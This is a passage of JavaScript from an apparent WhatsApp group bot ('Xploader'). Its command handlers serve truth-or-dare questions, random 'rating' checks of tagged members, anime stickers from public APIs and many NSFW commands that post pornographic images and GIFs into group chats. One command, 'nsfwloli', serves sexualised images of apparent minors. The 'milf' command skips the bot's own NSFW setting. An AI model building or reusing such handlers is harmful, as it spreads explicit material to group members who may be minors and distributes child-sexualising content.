          "What achievements have you got this year??",
          "What's your worst habit at school??",
          "What song do you sing most in the shower",
          "Have you ever had a near-death experience",
          "When was the last time you were really angry. Why?",
          "Who is the last person who called you",
          "Do you have any hidden talents, What are they",
          "What word do you hate the most?",
          "What is the last YouTube video you watched?",
          "What is the last thing you Googled",
          "Who in this group would you want to swap lives with for a week",
          "What is the scariest thing thats ever happened to you",
          "Have you ever farted and blamed it on someone else",
          "When is the last time you made someone else cry",
          "Have you ever ghosted a friend",
          "Have you ever seen a dead body",
          "Which of your family members annoys you the most and why",
          "If you had to delete one app from your phone, which one would it be",
          "What app do you waste the most time on",
          "Have you ever faked sick to get home from school",
          "What is the most embarrassing item in your room",
          "What five items would you bring if you got stuck on a desert island",
          "Have you ever laughed so hard you peed your pants",
          "Do you smell your own farts",
          "have u ever peed on the bed while sleeping ??",
          "What is the biggest mistake you have ever made",
          "Have you ever cheated in an exam",
          "What is the worst thing you have ever done",
          "When was the last time you cried",
          "whom do you love the most among ur parents",
          "do u sometimes put ur finger in ur nosetril?",
          "who was ur crush during the school days",
          "tell honestly, do u like any boy in this grup",
          "have you ever liked anyone? how long?",
          "do you have gf/bf','what is your biggest fear?",
          "have you ever liked someone and felt that person likes you too?",
          "What is the name of your ex boyfriend of your friend that you once liked quietly?",
          "ever did you steal your mothers money or your fathers money",
          "what makes you happy when you are sad",
          "do you like someone who is in this grup? if you then who?",
          "have you ever been cheated on by people?",
          "who is the most important person in your life",
          "what proud things did you get this year",
          "who is the person who can make you happy when u r sad",
          "who is the person who ever made you feel uncomfortable",
          "have you ever lied to your parents",
          "do you still like ur ex",
          "who do you like to play together with?",
          "have you ever stolen big thing in ur life? the reason why?",
          "Mention the incident that makes you hurt that you still remember",
          "what achievements have you got this year?",
          "what was your worst habit at school?",
          "do you love the bot creator, Tylor?ðŸ¤£",
          "have you ever thought of taking revenge from ur teacher?",
          "do you like current prime minister of ur country",
          "you non veg or veg",
          "if you could be invisible, what is the first thing you would do",
          "what is a secret you kept from your parents",
          "Who is your secret crush",
          "whois the last person you creeped on social media",
          "If a genie granted you three wishes, what would you ask for",
          "What is your biggest regret",
          "What animal do you think you most look like",
          "How many selfies do you take a day",
          "What was your favorite childhood show",
          "if you could be a fictional character for a day, who would you choose",
          "whom do you text the most",
          "What is the biggest lie you ever told your parents",
          "Who is your celebrity crush",
          "Whats the strangest dream you have ever had",
          "do you play pubg, if you then send ur id number",
        ];
        const XpBottruth = truth[Math.floor(Math.random() * truth.length)];
        buffertruth = await getBuffer(
          `https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`
        );
        Xploader.sendMessage(
          from,
          { image: buffertruth, caption: "_You choose TRUTH_\n" + XpBottruth },
          { quoted: m }
        );
        break;
//=================================================//
      case "cry":
      case "kill":
      case "hug":
      case "pat":
      case "lick":
      case "kiss":
      case "bite":
      case "yeet":
      case "bully":
      case "bonk":
      case "wink":
      case "poke":
      case "nom":
      case "slap":
      case "smile":
      case "wave":
      case "awoo":
      case "blush":
      case "smug":
      case "glomp":
      case "happy":
      case "dance":
      case "cringe":
      case "cuddle":
      case "highfive":
      case "shinobu":
      case "handhold":
        {
          axios
            .get(`https://api.waifu.pics/sfw/${command}`)
            .then(({ data }) => {
              Xploader.sendImageAsSticker(from, data.url, m, {
                packname: global.packname,
                author: global.author,
              });
            });
        }
        break;
//=================================================//
      case "woof":
      case "8ball":
      case "goose":
      case "gecg":
      case "feed":
      case "avatar":
      case "foxgirl":
      case "lizard":
      case "spank":
      case "meow":
      case "tickle":
        {
          axios
            .get(`https://nekos.life/api/v2/img/${command}`)
            .then(({ data }) => {
              Xploader.sendImageAsSticker(from, data.url, m, {
                packname: global.packname,
                author: global.author,
              });
            });
        }
        break;
//=================================================//
      case "checkme":
        neme = args.join(" ");
        bet = `${sender}`;
        var sifat = [
          "Fine",
          "Unfriendly",
          "Annoying",
          "Dilapidated",
          "Angry person",
          "Polite",
          "Burden",
          "Great",
          "Cringe",
          "Liar",
        ];
        var hoby = [
          "Cooking",
          "Dancing",
          "Playing",
          "Gaming",
          "Painting",
          "Helping Others",
          "Watching anime",
          "Reading",
          "Riding Bike",
          "Singing",
          "Chatting",
          "Sharing Memes",
          "Drawing",
          "Eating Parents Money",
          "Playing Truth or Dare",
          "Staying Alone",
        ];
        var cakep = ["Yes", "No", "Very Ugly", "Very Handsome"];
        var wetak = [
          "Caring",
          "Generous",
          "Angry person",
          "Sorry",
          "Submissive",
          "Fine",
          "Im sorry",
          "Kind Hearted",
          "Patient",
          "Top",
          "Helpful",
        ];

        var sipat = sifat[Math.floor(Math.random() * sifat.length)];
        var biho = hoby[Math.floor(Math.random() * hoby.length)];
        var bhucin = getRandomNumber(0, 100);
        var senga = getRandomNumber(0, 100);
        var chakep = cakep[Math.floor(Math.random() * cakep.length)];
        var watak = wetak[Math.floor(Math.random() * wetak.length)];
        var baik = getRandomNumber(0, 100);
        var burug = getRandomNumber(0, 100);
        var cerdas = getRandomNumber(0, 100);
        var berani = getRandomNumber(0, 100);
        var takut = getRandomNumber(0, 100);
        profile = `*≡══《 Check @${bet.split("@")[0]} 》══≡*

*Name :* ${pushname}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`;
        try {
          ppuser = await Xploader.profilePictureUrl(m.sender, "image");
        } catch (err) {
          ppuser =
            "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
        }
        ppXpBot = await getBuffer(ppuser);
        Xploader.sendMessage(
          from,
          { image: ppXpBot, caption: profile, mentions: [bet] },
          { quoted: m }
        );
        break;
//=================================================//
      case "charactercheck":
        if (!text)
          return reply(
            `Tag Someone, Example : ${prefix + command} @Tylor`
          );
        const XpBot = [
          "Compassionate",
          "Generous",
          "Grumpy",
          "Forgiving",
          "Obedient",
          "Good",
          "Simp",
          "Kind-Hearted",
          "patient",
          "UwU",
          "top, anyway",
          "Helpful",
        ];
        const taky = XpBot[Math.floor(Math.random() * XpBot.length)];
        Xploader.sendMessage(
          from,
          { text: `Character Check : ${q}\nAnswer : *${taky}*` },
          { quoted: m }
        );
        break;
      case "stupidcheck":
      case "uncleancheck":
      case "hotcheck":
      case "smartcheck":
      case "evilcheck":
      case "dogcheck":
      case "coolcheck":
      case "waifucheck":
      case "handsomecheck":
      case "beautifulcheck":
      case "awesomecheck":
      case "greatcheck":
      case "gaycheck":
      case "cutecheck":
      case "lesbiancheck":
      case "hornycheck":
      case "prettycheck":
      case "lovelycheck":
      case "uglycheck":
        if (!m.isGroup) return reply(mess.group);
        const cex = body.slice(0);
        const cek2 = getRandomNumber(0, 100);
        if (mentionByReply) {
          Xploader.sendMessage(
            from,
            {
              text:
                "Question : *" +
                cex +
                "*\nChecker : " +
                `@${mentionByReply.split("@")[0]}` +
                "\nAnswer : " +
                cek2 +
                "%",
              mentions: [mentionByReply],
            },
            { quoted: m }
          );
        } else if (mentionByTag[0] && isGroup) {
          Xploader.sendMessage(
            from,
            {
              text:
                "Question : *" +
                cex +
                "*\nChecker : " +
                `@${mentionByTag[0].split("@")[0]}` +
                "\nAnswer : " +
                cek2 +
                "%",
              mentions: [mentionByTag[0]],
            },
            { quoted: m }
          );
        } else if (!mentionByReply && !mentionByTag[0]) {
          Xploader.sendMessage(
            from,
            {
              text:
                "Question : *" +
                cex +
                "*\nChecker : " +
                `@${sender.split("@")[0]}` +
                "\nAnswer : " +
                cek2 +
                "%",
              mentions: [sender],
            },
            { quoted: m }
          );
        }
        break;
//=================================================//
      case "lovesticker":
        {
          var ano = await fetchJson(
            "https://raw.githubusercontent.com/DGXeon/XeonMedia/main/love"
          );
          var wifegerak = ano.split("\n");
          var wifegerakx =
            wifegerak[Math.floor(Math.random() * wifegerak.length)];
          encmedia = await Xploader.sendImageAsSticker(
            from,
            wifegerakx,
            m,
            { packname: global.packname, author: global.author }
          );
        }
        break;
//=================================================//
  case "ssweb":
  case "screenshot":
  case "ss":
  {
        if (!q) return reply(`Please provide a URL to screenshot!`);
        const api4Url = `https://widipe.com/ssfull?url=${q}`;
        try {
          await Xploader.sendMessage(m.chat, { image: { url: api4Url } }, { quoted: m });
        } catch (error) {
          console.error(error);
          reply("An error occurred while generating the image.");
        }
      }
        break;
//=================================================//
  case "sswebtab":
  {
        if (!q) return reply(`Please provide a URL to screenshot!`);
        const api5Url = `https://widipe.com/sstab?url=${q}`;
        try {
          await Xploader.sendMessage(m.chat, { image: { url: api5Url } }, { quoted: m });
        } catch (error) {
          console.error(error);
          reply("An error occurred.");
        }
      }
        break;
//=================================================//
  case "sswebpc":
  {
        if (!q) return reply(`Please provide a query to generate an image. Example: ${prefix + command} Beautiful landscape`);
        const api6Url = `https://widipe.com/sspc?url=${q}`;
        try {
          await Xploader.sendMessage(m.chat, { image: { url: api6Url } }, { quoted: m });
        } catch (error) {
          console.error(error);
          reply("An error occurred.");
        }
      }
        break;
//=================================================//
      case "ttp":
        if (args.length == 0)
          return reply(`Example: ${prefix + command} Tylor`);
        dgXpBottks = args.join(" ");
        dgXpBotvuff = await getBuffer(
          `https://widipe.com/ttp?text=${dgXpBottks}`
        );
        Xploader.sendImageAsSticker(m.chat, dgXpBotvuff, m, {
          packname: packname,
          author: author,
        });
        break;
//=================================================//
      case "attp":
        if (args.length == 0)
          return reply(`Example: ${prefix + command} Tylor`);
        dgXpBottks2 = args.join(" ");
        dgXpBotvuff2 = await getBuffer(
          `https://widipe.com/attp?text=${dgXpBottks2}`
        );
        Xploader.sendImageAsSticker(m.chat, dgXpBotvuff2, m, {
          packname: packname,
          author: author,
        });
        break;
//=================================================//
      case "blur":
        {
          if (!isMedia) return reply("Where Is The Image");
          let media = await Xploader.downloadAndSaveMediaMessage(quoted);
          let anu = await TelegraPh(media);
          Xploader.sendMessage(
            m.chat,
            {
              image: {
                url: `https://widipe.com/blur?url=${anu}`,
              },
              caption: "©𝐗𝐩𝐥𝐨𝐚𝐝𝐞𝐫𝐁𝐨𝐭",
            },
            { quoted: m }
          );
        }
        break;
//=================================================//
      case "hentaivideo":
        {
          if (!m.isGroup) return  reply(mess.group);
          if (!AntiNsfw) return reply(mess.nsfw);
          const { hentai } = require("./lib/scraper.js");
          anu = await hentai();
          result912 = anu[Math.floor(Math.random(), anu.length)];
          Xploader.sendMessage(
            m.chat,
            {
              video: { url: result912.video_1 },
              caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}`,
            },
            { quoted: m }
          );
        }
        break;
//=================================================//
      case "trap":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: waifudd.data.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "neko":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: waifudd.data.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "waifu":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: waifudd.data.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "gasm":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: waifudd.data.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "milf":
        if (!m.isGroup) return reply(mess.group);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/milf.json")
        );
        var XpBotresult = pickRandom(ahegaonsfw);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: XpBotresult.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "animespank":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`);
        await Xploader.sendMessage(
          m.chat,
          {
            caption: `©𝐗𝐩𝐥𝐨𝐚𝐝𝐞𝐫𝐁𝐨𝐭`,
            image: { url: waifudd.data.url },
          },
          { quoted: m }
        ).catch((err) => {
          return "Error!";
        });
        break;
//=================================================//
      case "ahegao":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/ahegao.json")
        );
        var XpBotresult = pickRandom(ahegaonsfw);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: XpBotresult.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "ass":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/ass.json")
        );
        var XpBotresult = pickRandom(ahegaonsfw);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: XpBotresult.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "bdsm":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/bdsm.json")
        );
        var XpBotresult = pickRandom(ahegaonsfw);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: XpBotresult.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "blowjob":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/blowjob.json")
        );
        var XpBotresult = pickRandom(ahegaonsfw);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: XpBotresult.url } },
          { quoted: m }
        );
        break;
 //=================================================//
      case "cuckold":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/cuckold.json")
        );
        var XpBotresult = pickRandom(ahegaonsfw);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: XpBotresult.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "cum":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/cum.json")
        );
        var XpBotresult = pickRandom(ahegaonsfw);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: XpBotresult.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "eba":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/eba.json")
        );
        var XpBotresult = pickRandom(ahegaonsfw);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: XpBotresult.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "ero":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/ero.json")
        );
        var XpBotresult = pickRandom(ahegaonsfw);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: XpBotresult.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "femdom":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/femdom.json")
        );
        var XpBotresult = pickRandom(ahegaonsfw);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: XpBotresult.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "foot":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/foot.json")
        );
        var XpBotresult = pickRandom(ahegaonsfw);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: XpBotresult.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "gangbang":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/gangbang.json")
        );
        var XpBotresult = pickRandom(ahegaonsfw);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: XpBotresult.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "glasses":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/glasses.json")
        );
        var XpBotresult = pickRandom(ahegaonsfw);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: XpBotresult.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "hentai":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/hentai.json")
        );
        var XpBotresult = pickRandom(ahegaonsfw);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: XpBotresult.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "jahy":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/jahy.json")
        );
        var XpBotresult = pickRandom(ahegaonsfw);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: XpBotresult.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "manga":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/manga.json")
        );
        var XpBotresult = pickRandom(ahegaonsfw);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: XpBotresult.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "masturbation":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/masturbation.json")
        );
        var XpBotresult = pickRandom(ahegaonsfw);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: XpBotresult.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "neko-hentai":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/neko.json")
        );
        var XpBotresult = pickRandom(ahegaonsfw);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: XpBotresult.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "neko-hentai2":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/neko2.json")
        );
        var XpBotresult = pickRandom(ahegaonsfw);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: XpBotresult.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "nsfwloli":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/nsfwloli.json")
        );
        var XpBotresult = pickRandom(ahegaonsfw);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: XpBotresult.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "orgy":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/orgy.json")
        );
        var XpBotresult = pickRandom(ahegaonsfw);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: XpBotresult.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "panties":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/panties.json")
        );
        var XpBotresult = pickRandom(ahegaonsfw);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: XpBotresult.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "pussy":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/pussy.json")
        );
        var XpBotresult = pickRandom(ahegaonsfw);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: XpBotresult.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "tentacles":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/tentacles.json")
        );
        var XpBotresult = pickRandom(ahegaonsfw);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: XpBotresult.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "thighs":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/thighs.json")
        );
        var XpBotresult = pickRandom(ahegaonsfw);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: XpBotresult.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "yuri":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/yuri.json")
        );
        var XpBotresult = pickRandom(ahegaonsfw);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: XpBotresult.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "zettai":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/zettai.json")
        );
        var XpBotresult = pickRandom(ahegaonsfw);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: XpBotresult.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "gifblowjob":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        let assss = await axios.get("https://api.waifu.pics/nsfw/blowjob");
        var bobuff = await fetchBuffer(assss.data.url);
        var bogif = await buffergif(bobuff);
        await Xploader.sendMessage(
          m.chat,
          { video: bogif, gifPlayback: true },
          { quoted: m }
        ).catch((err) => {});
        break;
//=================================================//
      case "gifhentai":
        if (!m.isGroup) return reply(mess.group);
        if (!AntiNsfw) return reply(mess.nsfw);
        var ahegaonsfw = JSON.parse(
          fs.readFileSync("./src/media/nsfw/gifs.json")
        );
        var XpBotresultx = pickRandom(ahegaonsfw);
        await Xploader.sendMessage(
          m.chat,
          { video: XpBotresultx, gifPlayback: true },
          { quoted: m }
        ).catch((err) => {});
        break;
//=================================================//
      case "animeawoo":
        {
          waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animemegumin":
        {
          waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animeshinobu":
        {
          waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animehandhold":
        {
          waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animehighfive":
        {
          waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animecringe":
        {
          waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animedance":
        {
          waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animehappy":
        {
          waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animeglomp":
        {
          waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animesmug":
        {
          waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animeblush":
        {
          waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animewave":
        {
          waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
 //=================================================//
      case "animesmile":
        {
          waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animepoke":
        {
          waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animewink":
        {
          waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animebonk":
        {
          waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animebully":
        {
          waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animeyeet":
        {
          waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animebite":
        {
          waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animelick":
        {
          waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
//=================================================//
      case "animekill":
        {
          waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`);
          await Xploader.sendMessage(
            m.chat,
            { image: { url: waifudd.data.url }, caption: mess.success },
            { quoted: m }
          ).catch((err) => {
            return "Error!";
          });
        }
        break;
